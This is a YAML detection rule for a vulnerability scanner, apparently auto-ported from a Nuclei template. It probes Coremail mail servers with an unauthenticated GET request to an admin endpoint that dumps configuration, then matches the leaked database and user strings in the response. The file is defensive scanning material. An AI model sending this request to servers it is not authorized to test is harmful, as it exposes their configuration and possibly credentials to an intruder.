schema_version: 1
id: "cortex.community:coremail-config-disclosure"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Coremail - Config Discovery"
  description: "Coremail configuration information was discovered. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.secpulse.com/archives/107611.html"
  tags: ["config", "exposure", "coremail", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request: { method: "GET", path: "/mailsms/s?func=ADMIN:appState&dumpConfig=/" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - any:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<object name=\"cm_md_db\">" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "containerDefinitions" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<string name=\"User\">coremail</string>" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<string name=\"EnableCoremailSmtp\">" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
